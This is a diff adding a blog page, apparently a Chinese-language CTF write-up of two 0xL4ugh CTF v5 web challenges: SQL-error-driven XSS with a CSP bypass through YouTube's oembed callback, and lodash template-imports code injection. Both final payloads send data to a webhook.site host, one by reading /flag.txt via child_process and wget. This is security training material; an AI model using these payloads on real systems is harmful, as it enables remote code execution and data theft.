@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang=&#34;en&#34;>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#070807">
+  <title>Some CTF 2026 · Deen&#39;s blog</title>
+  <link rel="icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="/css/style.css?v=1.1.2"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><main class="site-shell">
+    <header class="site-header">
+  <nav class="site-nav" aria-label="Primary navigation">
+    
+      <a href="/">Home</a>
+    
+      <a href="/archives/">Archives</a>
+    
+      <a href="/about/">About</a>
+    
+  </nav>
+</header>
+<div class="header-rule" aria-hidden="true"></div>
+
+    <article class="post-detail" itemscope itemtype="https://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 itemprop="headline">Some CTF 2026</h1>
+    <p class="post-meta">
+      <time datetime="2026-01-24T22:31:22.000Z" itemprop="datePublished">2026-01-24</time>
+      
+    </p>
+  </header>
+  <div class="article-content" itemprop="articleBody"><h2 id="0xL4ugh-CTF-v5-Smol-Web"><a href="#0xL4ugh-CTF-v5-Smol-Web" class="headerlink" title="0xL4ugh CTF v5 | Smol Web"></a>0xL4ugh CTF v5 | Smol Web</h2><p>绕过CSP执行XSS</p>
+<p>这里有两个思路，一个是二次注入在creator处控制输出，然后XSS，两外一个思路是利用这段代码进行报错。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">products_with_ratings = []</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    rows = db.execute(sql).fetchall()</span><br><span class="line"><span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">    rating_app.logger.error(<span class="string">f"SQL Error: <span class="subst">&#123;e&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">"&lt;h1&gt;[ERROR 500] Database Malfunction. Please report this bug.&lt;/h1&gt;"</span> + str(e), <span class="number">500</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里我选择使用报错，</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">31.34</span>:<span class="number">5000</span>/ratings?quantity=<span class="number">0</span><span class="symbol">%20</span>OR<span class="symbol">%20</span>(SELECT<span class="symbol">%201</span><span class="symbol">%20</span>FROM<span class="symbol">%20</span>`<span class="symbol">%3</span>Cimg/src=<span class="keyword">x</span><span class="symbol">%3</span>E`)</span><br></pre></td></tr></table></figure>
+
+<p>这是我的payload，选择一个不存在表名，然后输出可控的payload。</p>
+<p>这里我使用了反引号，这个是比较关键一点，因为过滤单引号和双引号。</p>
+<p>可以控制标签之后，让我们看一下这个CSP.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">csp = (</span><br><span class="line">    <span class="string">"default-src 'self'; "</span></span><br><span class="line">    <span class="string">"script-src 'self' https://cdn.tailwindcss.com https://www.youtube.com; "</span></span><br><span class="line">    <span class="string">"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; "</span></span><br><span class="line">    <span class="string">"font-src 'self' https://fonts.gstatic.com; "</span></span><br><span class="line">    <span class="string">"img-src 'self' data:; "</span></span><br><span class="line">    <span class="string">"child-src 'self' https://www.youtube.com; "</span></span><br><span class="line">    <span class="string">"frame-src 'self' https://www.youtube.com; "</span></span><br><span class="line">    <span class="string">"object-src 'none'; "</span></span><br><span class="line">    <span class="string">"base-uri 'self'; "</span></span><br><span class="line">    <span class="string">"form-action 'self';"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>这里相对比较简单，直接使用youtube这个绕过。</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;https://www.youtube.com/oembed?callback=fetch(<span class="meta">%27</span>/search<span class="meta">%27</span>,&#123;method:<span class="meta">%27POST</span><span class="meta">%27</span>,headers:&#123;<span class="meta">%27Content-Type</span><span class="meta">%27:</span><span class="meta">%27application</span>/x-www-form-urlencoded<span class="meta">%27</span>&#125;,body:<span class="meta">%27search</span>=!<span class="meta">%20</span><span class="meta">%60</span>/*gbi*y<span class="meta">%60</span><span class="meta">%27</span>&#125;).<span class="keyword">then</span>(<span class="keyword">function</span>(r)&#123;<span class="keyword">return</span><span class="meta">%20r</span>.<span class="type">text</span>()&#125;).<span class="keyword">then</span>(<span class="keyword">function</span>(b)&#123;<span class="meta">%27https:</span>//webhook.site/a138efe1-<span class="number">2</span>da9-<span class="number">4</span>b69-<span class="number">8</span>a1<span class="number">0</span>-0a7ba9561c3d?a=<span class="meta">%27</span><span class="meta">%2bbtoa</span>(new<span class="meta">%20DOMParser</span>().parseFromString(b,<span class="meta">%27text</span>/html<span class="meta">%27</span>).body.innerText)&#125;)&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lh3.googleusercontent.com/d/1EGRggguzQ44cHKZ5H-fuIAluJSvSXKkv" alt=""></p>
+<p>这是我的payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'/search'</span>, &#123;</span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="string">'search=! `/*gbi*y`'</span></span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r.text()</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">    locaton.href = <span class="string">'https://webhook.site/a138efe1-2da9-4b69-8a10-0a7ba9561c3d?a='</span> + btoa(<span class="keyword">new</span> DOMParser().parseFromString(b, <span class="string">'text/html'</span>).body.innerText)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>剩下最后一步就是执行命令获取flag.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize_input</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    s = str(payload)</span><br><span class="line">    cmds = [<span class="string">'cc'</span>, <span class="string">'gcc '</span>, <span class="string">'ex '</span>, <span class="string">'sleep '</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r"""[&lt;&gt;mhnpdvq$srl+%kowatf123456789'^@"\\]"""</span>, s):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Character Not Allowed"</span></span><br><span class="line">    <span class="keyword">if</span> any(cmd <span class="keyword">in</span> s <span class="keyword">for</span> cmd <span class="keyword">in</span> cmds):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Command Not Allowed"</span></span><br><span class="line">    pattern = re.compile(<span class="string">r'([;&amp;|$\(\)\[\]&lt;&gt;])'</span>)</span><br><span class="line">    escaped = pattern.sub(<span class="string">r'\\\1'</span>, s)</span><br><span class="line">    <span class="keyword">return</span> escaped</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">f"find <span class="subst">&#123;FILES_DIR&#125;</span> <span class="subst">&#123;sanitized_payload&#125;</span>"</span></span><br></pre></td></tr></table></figure>
+
+<p>这里过滤了一堆乱七八糟的东西，说实话实际上场景根本不会这样，实在是为了出题而出题。</p>
+<p>这里过滤太多东西，剩下一个反引号，还有就是找find命令支持哪些参数。</p>
+<p>找到一个</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在处理复杂的组合逻辑时，优先级非常重要：</span><br><span class="line"></span><br><span class="line"><span class="keyword">NOT</span> 最高 (!)</span><br><span class="line"></span><br><span class="line"><span class="keyword">AND</span> 次之 (-a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">OR</span> 最低 (-o)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lh3.googleusercontent.com/d/1U6u2xGxIo16NFdZaDcS1Q9_Ijo3VarGD" alt=""></p>
+<p>最终解题的payload</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;/ratings?quantity=<span class="number">0</span><span class="meta">%20OR</span><span class="meta">%20</span>(SELECT<span class="meta">%201</span><span class="meta">%20FROM</span><span class="meta">%20</span>`<span class="meta">%3Cscript</span><span class="meta">%20src</span>=https://www.youtube.com/oembed?callback=fetch(<span class="meta">%2527</span>/search<span class="meta">%2527</span>,&#123;method:<span class="meta">%2527POST</span><span class="meta">%2527</span>,headers:&#123;<span class="meta">%2527Content-Type</span><span class="meta">%2527:</span><span class="meta">%2527application</span>/x-www-form-urlencoded<span class="meta">%2527</span>&#125;,body:<span class="meta">%2527search</span><span class="meta">%3d</span>!<span class="meta">%2520</span><span class="meta">%2560</span>/*gbi*y<span class="meta">%2560</span><span class="meta">%2527</span>&#125;).<span class="keyword">then</span>(<span class="keyword">function</span>(r)&#123;<span class="keyword">return</span><span class="meta">%2520r</span>.<span class="type">text</span>()&#125;).<span class="keyword">then</span>(<span class="keyword">function</span>(b)&#123;location.href=<span class="meta">%2527https:</span>//webhook.site/a138efe1-<span class="number">2</span>da9-<span class="number">4</span>b69-<span class="number">8</span>a1<span class="number">0</span>-0a7ba9561c3d?a=<span class="meta">%2527</span><span class="meta">%252bbtoa</span>(new<span class="meta">%2520DOMParser</span>().parseFromString(b,<span class="meta">%2527text</span>/html<span class="meta">%2527</span>).body.innerText)&#125;)<span class="meta">%3E</span><span class="meta">%3C</span>/script<span class="meta">%3E</span>//`)&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lh3.googleusercontent.com/d/1h8ELSV6ORr6kf2byX-23gSF162TMFLlc" alt=""></p>
+<h3 id="0xL4ugh-CTF-v5-gap"><a href="#0xL4ugh-CTF-v5-gap" class="headerlink" title="0xL4ugh CTF v5 | gap"></a>0xL4ugh CTF v5 | gap</h3><p>简单给了个源码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> cons = <span class="built_in">require</span>(<span class="string">'consolidate'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'html'</span>, cons.lodash);</span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'html'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/render'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, req.body, (err, html) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.sendStatus(<span class="number">500</span>);</span><br><span class="line">    res.send(html);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">'listening on 3000'</span>));</span><br></pre></td></tr></table></figure>
+
+<p>还给了个dockerfile</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">18</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install express consolidate lodash body-parser</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir views &amp;&amp; <span class="built_in">echo</span> <span class="string">'&lt;%= input %&gt;'</span> &gt; views/index.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"0xL4ugh&#123;REDACTED&#125;"</span> &gt; /flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> server.js .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"node"</span>, <span class="string">"server.js"</span>]</span></span><br></pre></td></tr></table></figure>
+
+<p>这里为了加大难度吧，版本也没具体给，实际上就是让自己去找。</p>
+<p>把docker给装上，npm list一下，版本就出来了。</p>
+<p>为了本地调试方便，直接把package.json搞好。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"lodash-ssti-debug"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"CTF Lodash SSTI Debug Environment"</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"server.js"</span>,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"start"</span>: <span class="string">"node server.js"</span>,</span><br><span class="line">    <span class="attr">"debug"</span>: <span class="string">"node --inspect server.js"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"5.2.1"</span>,</span><br><span class="line">    <span class="attr">"consolidate"</span>: <span class="string">"1.0.4"</span>,</span><br><span class="line">    <span class="attr">"lodash"</span>: <span class="string">"4.17.23"</span>,</span><br><span class="line">    <span class="attr">"body-parser"</span>: <span class="string">"2.2.2"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"engines"</span>: &#123;</span><br><span class="line">    <span class="attr">"node"</span>: <span class="string">"&gt;=18.0.0"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不熟悉lodash，可以找下文档。这里会把request.body的东西都传过去，有些会当做options的参数去处理。</p>
+<p><a href="https://lodash.com/docs/#templateSettings-imports-">https://lodash.com/docs/#templateSettings-imports-</a>_</p>
+<p>支持的参数看这个文档。找到以下几个。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_.templateSettings</span><br><span class="line">_<span class="selector-class">.templateSettings</span><span class="selector-class">.escape</span></span><br><span class="line">_<span class="selector-class">.templateSettings</span><span class="selector-class">.evaluate</span></span><br><span class="line">_<span class="selector-class">.templateSettings</span><span class="selector-class">.imports</span></span><br><span class="line">_<span class="selector-class">.templateSettings</span><span class="selector-class">.interpolate</span></span><br><span class="line">_<span class="selector-class">.templateSettings</span><span class="selector-class">.variable</span></span><br><span class="line">_<span class="selector-class">.templateSettings</span><span class="selector-class">.imports</span>._</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lh3.googleusercontent.com/d/1-MKbhC84BZXHSFd8n1haJgMx2lFk2Wqy" alt=""></p>
+<p><img src="https://lh3.googleusercontent.com/d/1NpZCbUcl_kIBX69sP5q7qBdRkWnawitR" alt=""></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">source = <span class="string">'function('</span> + (variable || <span class="string">'obj'</span>) + <span class="string">') &#123;\n'</span> +</span><br><span class="line">(variable</span><br><span class="line">    ? <span class="string">''</span></span><br><span class="line">    : <span class="string">'obj || (obj = &#123;&#125;);\n'</span></span><br><span class="line">) +</span><br><span class="line"><span class="string">"var __t, __p = ''"</span> +</span><br><span class="line">(isEscaping</span><br><span class="line">    ? <span class="string">', __e = _.escape'</span></span><br><span class="line">    : <span class="string">''</span></span><br><span class="line">) +</span><br><span class="line">(isEvaluating</span><br><span class="line">    ? <span class="string">', __j = Array.prototype.join;\n'</span> +</span><br><span class="line">    <span class="string">"function print() &#123; __p += __j.call(arguments, '') &#125;\n"</span></span><br><span class="line">    : <span class="string">';\n'</span></span><br><span class="line">) +</span><br><span class="line">source +</span><br><span class="line"><span class="string">'return __p\n&#125;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(importsKeys, sourceURL);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">    .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里关键代码 <code>Function(importsKeys, sourceURL + &#39;return &#39; + source)</code></p>
+<p>importsKeys可控，sourceURL已经被修复了。</p>
+<p>利用这种写法实现命令执行。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Function</span>([<span class="string">'&#123;a=alert(1)&#125;'</span>], <span class="string">'&#123;&#125;'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>找个能外发的命令，最后payload</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  "input": "test",</span><br><span class="line">  "imports": &#123;</span><br><span class="line">   "&#123;input = this[<span class="string">'process'</span>][<span class="symbol">'mainModule'</span>][<span class="string">'require'</span>](<span class="link">'child_process'</span>)[<span class="string">'execSync'</span>](<span class="link">'wget https://webhook.site/a138efe1-2da9-4b69-8a10-0a7ba9561c3d?`cat\u0020/flag.txt`'</span>).toString()&#125;": &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+</article>
+
+    <footer class="site-footer">
+  Copyright © 2026 Deen&#39;s blog
+</footer>
+
+  </main>
+  <script>
+    (function () {
+      var terminal = document.querySelector('[data-terminal-intro]');
+      var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      if (!terminal || reduceMotion) return;
+
+      var introSeen = false;
+      try { introSeen = window.sessionStorage.getItem('deen-terminal-intro-seen') === '1'; } catch (error) {}
+      if (introSeen) return;
+      try { window.sessionStorage.setItem('deen-terminal-intro-seen', '1'); } catch (error) {}
+
+      var root = document.documentElement;
+      var lines = terminal.querySelectorAll('.terminal-command .terminal-typed');
+      var output = terminal.querySelector('.terminal-output');
+      var cursors = terminal.querySelectorAll('.terminal-cursor');
+      var list = document.querySelector('.post-list');
+      var pagination = document.querySelector('.terminal-status');
+      var text = Array.prototype.map.call(lines, function (line) { return line.textContent; });
+      var delay = function (milliseconds) { return new Promise(function (resolve) { window.setTimeout(resolve, milliseconds); }); };
+      var type = function (line, value) {
+        line.textContent = '';
+        return new Promise(function (resolve) {
+          var index = 0;
+          var tick = function () {
+            line.textContent += value.charAt(index++);
+            if (index < value.length) window.setTimeout(tick, 28);
+            else resolve();
+          };
+          tick();
+        });
+      };
+
+      root.classList.add('terminal-booting');
+      cursors[0].classList.add('is-active');
+      output.classList.remove('is-visible');
+      type(lines[0], text[0])
+        .then(function () {
+          cursors[0].classList.remove('is-active');
+          output.classList.add('is-visible');
+          return delay(260);
+        })
+        .then(function () { cursors[1].classList.add('is-active'); })
+        .then(function () { return type(lines[1], text[1]); })
+        .then(function () {
+          cursors[1].classList.remove('is-active');
+          Array.prototype.forEach.call(list.children, function (item, index) {
+            item.style.transitionDelay = (index * 42) + 'ms';
+            item.classList.add('is-visible');
+          });
+          if (pagination) pagination.classList.add('is-visible');
+          root.classList.remove('terminal-booting');
+        });
+    }());
+
+    document.querySelectorAll('.article-content .highlight').forEach(function (block) {
+      var code = block.querySelector('code, td.code, pre');
+      if (!code) return;
+      var className = block.className.split(/\s+/).find(function (name) { return name !== 'highlight'; });
+      var toolbar = document.createElement('div');
+      toolbar.className = 'code-toolbar';
+      toolbar.innerHTML = '<span class="code-controls" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-language"></span><button type="button" data-copy-code>Copy</button>';
+      toolbar.querySelector('.code-language').textContent = className || 'text';
+      block.prepend(toolbar);
+      var table = block.querySelector('table');
+      if (table) {
+        var scroller = document.createElement('div');
+        scroller.className = 'code-scroll';
+        table.parentNode.insertBefore(scroller, table);
+        scroller.appendChild(table);
+      }
+    });
+    document.addEventListener('click', function (event) {
+      var button = event.target.closest('[data-copy-code]');
+      if (!button) return;
+      var code = button.closest('.highlight, .code-block').querySelector('code, td.code, pre');
+      if (!code || !navigator.clipboard) return;
+      navigator.clipboard.writeText(code.innerText).then(function () {
+        button.textContent = 'Copied';
+        window.setTimeout(function () { button.textContent = 'Copy'; }, 1400);
+      });
+    });
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
